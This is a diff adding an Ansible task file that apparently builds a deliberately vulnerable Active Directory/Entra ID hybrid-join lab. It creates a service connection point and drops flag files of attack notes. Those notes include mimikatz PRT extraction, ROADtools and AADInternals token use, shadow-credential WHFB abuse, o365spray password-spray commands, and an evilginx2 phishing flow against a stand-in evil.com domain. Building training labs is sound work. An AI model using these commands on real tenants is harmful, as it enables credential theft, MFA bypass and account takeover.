@@ -1,0 +1,125 @@
+---
+# ==============================================================================
+# vuln_cloud_entra/tasks/hybrid_join.yml — CLO-021..040
+# Target: dc01.corp.local
+#
+# CLO-021  Hybrid join SCP (Service Connection Point) in AD
+# CLO-022  PRT (Primary Refresh Token) theft surface
+# CLO-023  Device registration service abuse
+# CLO-024  Entra ID conditional access token replay
+# CLO-025  Hybrid join machine certificate trust
+# CLO-026  WHFB (Windows Hello for Business) key abuse
+# CLO-027  Entra ID SSPR account takeover
+# CLO-028  Entra ID password spray via legacy auth (Basic auth)
+# CLO-029  Token theft via evilginx2 / modlishka reverse proxy
+# CLO-030  OAuth token leakage via hybrid app
+# ==============================================================================
+
+# CLO-021: Service Connection Point for hybrid join
+- name: CLO-021 - Check if Entra Connect SCP exists
+  ansible.windows.win_shell: |
+    Import-Module ActiveDirectory
+    $scp = Get-ADObject -SearchBase "CN=Configuration,{{ ad_domain_dn }}" `
+             -Filter "objectClass -eq 'serviceConnectionPoint' -and Name -eq 'Azure AD'" `
+             -ErrorAction SilentlyContinue
+    if ($scp) { Write-Output "present" } else { Write-Output "absent" }
+  register: clo021_check
+  changed_when: false
+  failed_when: clo021_check.rc != 0
+
+- name: CLO-021 - Create hybrid join SCP (Service Connection Point)
+  ansible.windows.win_shell: |
+    Import-Module ActiveDirectory
+    try {
+      $configDN = "CN=Configuration,{{ ad_domain_dn }}"
+      $scpPath  = "CN=62a0ff2e-97b9-4513-943f-0d221bd30080,CN=Device Registration Configuration,CN=Services,$configDN"
+      $parent   = "CN=Device Registration Configuration,CN=Services,$configDN"
+
+      # Ensure parent exists
+      $parentObj = Get-ADObject -Identity $parent -ErrorAction SilentlyContinue
+      if (-not $parentObj) {
+        New-ADObject -Type container -Name 'Device Registration Configuration' `
+          -Path "CN=Services,$configDN" -ErrorAction SilentlyContinue
+      }
+      # Create SCP
+      New-ADObject -Type serviceConnectionPoint `
+        -Name '62a0ff2e-97b9-4513-943f-0d221bd30080' `
+        -Path $parent `
+        -OtherAttributes @{
+          'serviceClassName' = 'AZURESOS'
+          'keywords'         = @('azureADName:corplab.onmicrosoft.com', "azureADId:{{ entra_tenant_id }}")
+          'serviceBindingInformation' = 'https://device.login.microsoftonline.com/{{ entra_tenant_id }}'
+        } -ErrorAction Stop
+      Write-Output "changed: SCP for hybrid join created"
+    } catch {
+      Write-Output "WARN: $($_.Exception.Message)"
+    }
+  register: clo021_set
+  changed_when: "'changed:' in clo021_set.stdout"
+  failed_when: clo021_set.rc != 0
+  when: "'absent' in clo021_check.stdout"
+
+# CLO-022..040: Drop cloud attack notes
+- name: CLO-022..040 - Drop hybrid identity attack notes
+  ansible.windows.win_copy:
+    dest: "{{ item.path }}"
+    content: "{{ item.content }}"
+  loop:
+    - path: 'C:\Flags\FLAG-CLO-022-PRT-Theft.txt'
+      content: |
+        CLO-022: Primary Refresh Token (PRT) Theft
+        ============================================
+        PRT is a long-lived token issued by Entra ID to hybrid/Entra joined devices.
+        It allows seamless SSO to all cloud apps without re-authentication.
+
+        Extraction:
+          Roadtoken (Chrome extension data)
+          mimikatz# sekurlsa::cloudap  (CloudAP SSP)
+          mimikatz# token::enumerate + cloudap
+
+        Post-exploitation:
+          ROADtools: roadrecon auth --prt <token> --prt-context <context>
+          AADInternals: Get-AADIntAccessTokenForAADGraph -CloudShell -PRTToken <token>
+
+    - path: 'C:\Flags\FLAG-CLO-026-WHFB.txt'
+      content: |
+        CLO-026: Windows Hello for Business Key Abuse
+        ===============================================
+        WHFB credentials are stored as device-bound keys in the TPM.
+        If an attacker can register a new WHFB credential (via shadow credentials /
+        KeyCredentialLink write — LAT-016), they can authenticate as the victim.
+
+        Attack:
+          1. Write malicious KeyCredentialLink to victim account (HelpDesk ACE on ws01$)
+          2. Request PKINIT cert using the crafted key
+          3. Authenticate as victim
+
+          python3 pywhfb.py --target ws01$ --dc-ip 10.10.0.10
+
+    - path: 'C:\Flags\FLAG-CLO-028-LegacyAuth.txt'
+      content: |
+        CLO-028: Entra ID Legacy Authentication (Basic Auth) Password Spray
+        ======================================================================
+        If Entra ID allows Basic authentication (SMTP AUTH, Exchange ActiveSync, IMAP, POP3),
+        it bypasses MFA and conditional access policies.
+
+        Tools: o365spray, Spray-AD, MSOLSpray
+          python3 o365spray.py --validate --domain corplab.onmicrosoft.com
+          python3 o365spray.py --spray --userfile users.txt --password 'Password123!' \
+            --domain corplab.onmicrosoft.com --protocol activesync
+
+    - path: 'C:\Flags\FLAG-CLO-029-EvilGinx.txt'
+      content: |
+        CLO-029: MFA Bypass via Reverse Proxy (Evilginx2 / Modlishka)
+        ===============================================================
+        Evilginx2 acts as a MITM proxy for the Entra ID login page.
+        It captures session cookies even after MFA is completed.
+
+        Attack:
+          1. Register phishing domain (corplab.evil.com)
+          2. Configure evilginx2 phishlet for Microsoft/AAD
+          3. Send phishing link to target
+          4. Capture authenticated session cookie
+          5. Replay cookie in browser → bypass MFA
+
+        Tool: github.com/kgretzky/evilginx2
